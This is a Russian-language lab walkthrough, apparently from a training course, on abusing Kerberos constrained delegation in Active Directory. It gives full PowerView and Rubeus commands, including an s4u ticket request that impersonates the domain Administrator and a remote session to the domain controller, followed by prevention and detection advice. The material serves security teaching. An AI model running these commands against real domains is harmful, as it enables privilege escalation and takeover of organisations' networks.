=====================================================================
* Руководство *
***************

Это пошаговое руководство, цель которой — продемонстрировать проблему, а не подробно описать атаку.

Атака будут выполняться с предоставленных машин Windows 10 (WS001) и Kali Linux.
Предполагается, что злоумышленник уже получил remote code execution (или что-то подобное) на этой машине Windows 10 (WS001).
Пользователь, который, как мы предполагаем, скомпрометирован, — это Боб, обычный пользователь в Active Directory без назначенных специальных разрешений.

Окружение состоит из следующих машин и соответствующих им IP-адресов:

	-	DC1		172.16.18.3
	-	DC2		172.16.18.4
	-	Server01	172.16.18.10
	-	PKI		172.16.18.15
	-	WS001		DHCP или 172.16.18.25 (в зависимости от раздела)
	-	Kali Linux	DHCP или 172.16.18.20 (в зависимости от раздела)

Если надо подключиться к любой из управляющих машин AD сервера (к примеру - DC1)

	i)		Поключаемся к хосту жертвы через RDP
	ii)		Пуск -> Windows Accessories -> Remote Desktop
	iii)		Computer	=	DC1 ip address
			User Name	=	Имя пользователя (к примеру htb-student)
	iv)		Пароль введем позже (будет предоставлен запрос)
	v)		Соглашаемся на устанвку соединения
	
=====================================================================
* Легенда *
***********

Делегирование Kerberos позволяет приложению получать доступ к ресурсам, размещенным на другом сервере
Например, вместо того, чтобы предоставлять учетной записи службы, запускающей веб-сервер, доступ к базе данных напрямую, мы можем разрешить делегировать учетную запись службе сервера SQL.
После того, как пользователь войдет на веб-сайт, учетная запись службы веб-сервера запросит доступ к службе сервера SQL от имени этого пользователя
Что позволит пользователю получить доступ к содержимому в базе данных, к которой он был предоставлен, без необходимости назначать какой-либо доступ самой учетной записи службы веб-сервера.

Мы можем настроить три типа делегирования в Active Directory:

	-	Unconstrained Delegation / Неограниченное делегирование (наиболее разрешающее/широкое)
		Как следует из названия, неограниченное делегирование является наиболее разрешающим, позволяя учетной записи делегировать любой службе.

	-	Constrained Delegation / Ограниченное делегирование
		При ограниченном делегировании учетная запись пользователя будет иметь свои свойства, настроенные для указания того, какие службы она может делегировать.

	-	Resource-based Delegation / Делегирование на основе ресурсов
		Для делегирования на основе ресурсов конфигурация находится в пределах объекта компьютера, которому делегируется. В этом случае компьютер настроен как "I trust only this/these accounts (Я доверяю только этому/этим учетным записям)".
		

Редко можно увидеть делегирование на основе ресурсов, настроенное администратором в производственных средах (агенты угроз часто злоупотребляют этим для компрометации устройств).
Однако неограниченное и ограниченное делегирование часто встречаются в производственных средах.

Знание и понимание того, что любой тип делегирования является возможным риском безопасности, имеет первостепенное значение, и мы должны избегать его, если это не необходимо.

=====================================================================
* Схема атаки *
***************

В данном примере будет продемонстрировано только злоупотребление ограниченным делегированием

Когда учетная запись доверена для делегирования, то она отправляет запрос в KDC со следующим текстом: «Give me a Kerberos ticket for user YYYY because I am trusted to delegate this user to service ZZZZ»
И для пользователя YYYY генерируется билет Kerberos (без предоставления пароля пользователя YYYY).

Также возможно делегирование другой службе, даже если это не настроено в свойствах пользователя.
Например, если нам доверено делегирование для LDAP, мы можем выполнить переход протокола и быть доверенными любой другой службе, такой как CIFS или HTTP.

Чтобы продемонстрировать атаку, мы предполагаем, что пользователь web_service доверен для делегирования и был скомпрометирован.
Пароль этой учетной записи — Slavi123.
Для начала мы воспользуемся функцией Get-NetUser из PowerView для перечисления учетных записей пользователей, которым доверено ограниченное делегирование в домене:

	PS C:\...\...\...> powershell.exe -ExecutionPolicy Bypass -File . .\PowerVeiw-main.ps1

***	Обратите внимание - наличи "." поле параметра -File и перед название скрипта .\PowerView.ps1 НЕ ЯВЛЯЕТСЯ ошибкой. Так надо!
	Также, в данном примере мы будем использовать Powerview-main.ps1 вместо Powerview.ps1 (так требуют условия примера)
	
Затем, используем комнадлет (функцию) Get-NetUser с параметром -TrustedToAuth

	PS C:\...\...\...> Get-NetUser -TrustedToAuth

***	Однаком, может возникнуть ошибка при запуске данной функции (Get-NetUser : The term 'Get-NetUser' is not recognized as the name of a cmdlet)
	Причина возникновения данной ошибки не понятна
	Может требуется время, чтобы все функции модуля Powerview подгрузились в базу данных пользоавтеля
	Но если по истечению времени ошибка не уходит, то можно установить разрешения на запуск исполняемых файлов на постоянной основе
	И потом запустить модуль Powerview-main.ps1 самостоятельно
		
		PS C:\...\...\...> Set-Executionpolicy -ExecutionPolicy Bypass -Scope Process
		PS C:\...\...\...> . .\Powerview-main.ps1
		PS C:\...\...\...> Get-NetUser -TrustedToAuth

Из всего полученного результат нас пока интересуют только следующие данные

	...SNIP...
	name                          : web service
	...SNIP...
	msds-allowedtodelegateto      : {http/DC1.eagle.local/eagle.local, http/DC1.eagle.local, http/DC1, http/DC1.eagle.local/EAGLE...}
	...SNIP...

Мы видим, что пользователь web_service настроен на делегирование HTTP-сервиса контроллеру домена DC1.
HTTP-сервис предоставляет возможность выполнения PowerShell Remoting.
Таким образом, любой субъект угрозы, получающий контроль над web_service, может запросить билет Kerberos для любого пользователя в Active Directory и использовать его для подключения к DC1 через PowerShell Remoting.

Прежде чем мы запросим билет с помощью Rubeus (который ожидает хэш пароля вместо открытого текста для аргумента /rc4, используемого впоследствии), нам нужно использовать его для преобразования открытого текста пароля Slavi123 в его эквивалент NTLM-хеша

	PS C:\...\...\...> .\Rubeus.exe hash /password:Slavi123

	rc4_hmac             : FCDC65703DD2B0BD789977F1F3EEAECF

Затем мы воспользуемся Rubeus, чтобы получить тикет для учетной записи администратора:

	PS C:\...\...\...> .\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF /domain:eagle.local /impersonateuser:Administrator /msdsspn:"http/dc1" /dc:dc1.eagle.local /ptt

Чтобы подтвердить, что Rubeus внедрил билет в текущий сеанс, мы можем использовать команду klist

	PS C:\...\...\...> klist

Имея билет, мы можем подключиться к контроллеру домена, выдавая себя за администратора учетной записи используя комндлет Enter-PSSession

	PS C:\...\...\...> Enter-PSSession dc1
	[dc1]: PS C:\Users\Administrator\Documents>

Чтобы удостовериться, что мы действительно подклбчились к контролеру домена под подминистратором, достаточно запутить пару утилит - host и  whoami

	[dc1]: PS C:\Users\Administrator\Documents> hostname
	DC1
	[dc1]: PS C:\Users\Administrator\Documents> whoami
	eagle\administrator
	[dc1]: PS C:\Users\Administrator\Documents>

Если последний шаг не удался (возможно, нам придется выполнить очистку klist, получить новые билеты и повторить попытку, перезагрузив машину).
Мы также можем запросить билеты для нескольких служб с аргументом /altservice, например, LDAP, CFIS, время и хост.

=====================================================================
* Предотвращение/защита *
*************************

К счастью, при проектировании делегирования Kerberos компания Microsoft реализовала несколько механизмов защиты
Однако она не включила их по умолчанию для какой-либо учетной записи пользователя.
Есть два прямых способа предотвратить выдачу билета для пользователя через делегирование:

	-	Настройте свойство (property) "Account is sensitive and cannot be delegated" для всех привилегированных пользователей.
	-	Добавьте привилегированных пользователей в группу Protected Users
		Это членство автоматически применяет защиту, упомянутую выше (однако не рекомендуется использовать Protected Users, не поняв предварительно его потенциальных последствий).

Мы должны рассматривать любую учетную запись, настроенную для делегирования, как чрезвычайно привилегированную, независимо от ее фактических привилегий (например, быть только пользователем домена).
Криптографически безопасные пароли являются обязательными, так как мы не хотим, чтобы Kerberoasting давал агентам угроз учетную запись с привилегиями делегирования.

=====================================================================
* Обнаружение *
***************

Корреляция поведения пользователей — лучший метод обнаружения злоупотреблений ограниченным делегированием.

Предположим, мы знаем место и время, которые пользователь регулярно использует для входа в систему.
В этом случае будет легко оповещать о других (подозрительных) поведениях, например, рассмотрим учетную запись «Администратор» в атаке, описанной выше.
Если зрелая организация использует рабочие станции с привилегированным доступом (PAW), она должна быть начеку о любых привилегированных пользователях, не проходящих аутентификацию с этих машин, активно отслеживая события с идентификатором 4624 (успешный вход в систему).

В некоторых случаях успешная попытка входа в систему с делегированным билетом будет содержать информацию об издателе билета в атрибуте Transited Services в журнале событий.
Этот атрибут обычно заполняется, если вход в систему произошел в результате процесса входа S4U (Service For User).

S4U — это расширение Microsoft для протокола Kerberos, которое позволяет службе приложения получать билет службы Kerberos от имени пользователя
Если вспомнить поток атаки при использовании Rubeus, мы указали это расширение S4U.

=====================================================================
* Ловушка/Honeypot *
********************

К сожалению вариантов с ловушкой для данного вида атаки представлено не было